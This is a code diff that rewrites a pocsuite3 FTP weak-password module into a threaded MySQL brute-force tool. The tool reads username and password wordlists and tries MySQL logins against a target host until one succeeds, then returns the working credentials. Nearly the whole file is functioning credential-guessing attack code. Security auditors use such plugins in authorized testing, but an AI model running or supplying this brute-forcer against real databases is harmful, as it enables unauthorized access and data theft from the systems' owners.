@@ -1,43 +1,54 @@
-"""
-If you have issues about development, please read:
-https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
-for more about information, plz visit https://pocsuite.org
-"""
-
-import ftplib
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# @File : mysql_burst.py
+# @Author : Norah C.IV
+# @Time : 2022/4/24 15:56
+# @Software: PyCharm
+import MySQLdb
 import itertools
 import queue
 import socket
 
-from pocsuite3.api import POCBase, Output, register_poc, logger, POC_CATEGORY, VUL_TYPE
+from collections import OrderedDict
+from pocsuite3.api import POCBase, Output, register_poc, POC_CATEGORY, VUL_TYPE, logger
 from pocsuite3.lib.core.data import paths
+from pocsuite3.lib.core.interpreter_option import OptInteger
 from pocsuite3.lib.core.threads import run_threads
 
 
 class DemoPOC(POCBase):
-    vulID = '62522'
-    version = '3'
-    author = ['seebug']
-    vulDate = '2013-11-21'
-    createDate = '2013-11-21'
-    updateDate = '2013-11-21'
-    references = ['http://sebug.net/vuldb/ssvid-62522']
-    name = 'FTP 弱密码'
+    vulID = '1'
+    version = '1'
+    author = ['Norah C.IV']
+    vulDate = '2022-04-24'
+    createDate = '2022-04-24'
+    updateDate = '2022-04-24'
+    references = ['']
+    name = 'MYSQL 弱密码'
     appPowerLink = ''
-    appName = 'ftp'
+    appName = 'MySQL'
     appVersion = 'All'
     vulType = VUL_TYPE.WEAK_PASSWORD
-    desc = '''ftp 存在弱密码，导致攻击者可连接进行文件管理进行恶意操作'''
+    desc = '''mysql 存在弱密码，攻击者可连接主机进行操作，导致数据泄露'''
     samples = ['']
+    install_requires = ['']
     category = POC_CATEGORY.TOOLS.CRACK
-    protocol = POC_CATEGORY.PROTOCOL.FTP
+    protocol = POC_CATEGORY.PROTOCOL.MYSQL
+
+    def _options(self):
+        o = OrderedDict()
+        o["mysql_burst_threads"] = OptInteger(4, description='set mysql_burst_threads', require=False)
+        return o
 
     def _verify(self):
         result = {}
         host = self.getg_option("rhost")
-        port = self.getg_option("rport") or 21
+        port = self.getg_option("rport") or 3306
+        mysql_burst_threads = self.get_option("mysql_burst_threads")
 
-        ftp_burst(host, port)
+        task_queue = queue.Queue()
+        result_queue = queue.Queue()
+        mysql_burst(host, port, task_queue, result_queue, mysql_burst_threads)
         if not result_queue.empty():
             username, password = result_queue.get()
             result['VerifyInfo'] = {}
@@ -60,17 +71,13 @@ class DemoPOC(POCBase):
         return output
 
 
-task_queue = queue.Queue()
-result_queue = queue.Queue()
-
-
 def get_word_list():
-    with open(paths.FTP_USER) as username:
-        with open(paths.FTP_PASS) as password:
+    with open(paths.MYSQL_USER) as username:
+        with open(paths.MYSQL_PASS) as password:
             return itertools.product(username, password)
 
 
-def port_check(host, port=21):
+def port_check(host, port=3306):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     connect = s.connect_ex((host, int(port)))
     if connect == 0:
@@ -80,56 +87,39 @@ def port_check(host, port=21):
         return False
 
 
-def anonymous_login(host, port):
-    return ftp_login(host, port, anonymous=True)
-
-
-def ftp_login(host, port, username=None, password=None, anonymous=False):
+def mysql_login(host, port, username, password):
     ret = False
     try:
-        ftp = ftplib.FTP()
-        ftp.connect(host, port, timeout=6)
-        if anonymous:
-            ftp.login()
-        else:
-            ftp.login(username, password)
+        MySQLdb.connect(host=host, port=port, user=username, passwd=password)
         ret = True
-        ftp.quit()
     except Exception:
         pass
     return ret
 
 
-def task_init(host, port):
+def task_init(host, port, task_queue, result_queue):
     for username, password in get_word_list():
         task_queue.put((host, port, username.strip(), password.strip()))
 
 
-def task_thread():
+def task_thread(task_queue, result_queue):
     while not task_queue.empty():
         host, port, username, password = task_queue.get()
         # logger.info('try burst {}:{} use username:{} password:{}'.format(
         #     host, port, username, password))
-        if ftp_login(host, port, username, password):
+        if mysql_login(host, port, username, password):
             with task_queue.mutex:
                 task_queue.queue.clear()
             result_queue.put((username, password))
 
 
-def ftp_burst(host, port):
+def mysql_burst(host, port, task_queue, result_queue, mysql_burst_threads):
     if not port_check(host, port):
         logger.warning("{}:{} is unreachable".format(host, port))
         return
-
-    if anonymous_login(host, port):
-        # logger.info('try burst {}:{} use username:{} password:{}'.format(
-        #     host, port, 'anonymous', '<empty>'))
-        result_queue.put(('anonymous', '<empty>'))
-        return
-
     try:
-        task_init(host, port)
-        run_threads(4, task_thread)
+        task_init(host, port, task_queue, result_queue)
+        run_threads(mysql_burst_threads, task_thread, args=(task_queue, result_queue))
     except Exception:
         pass
 
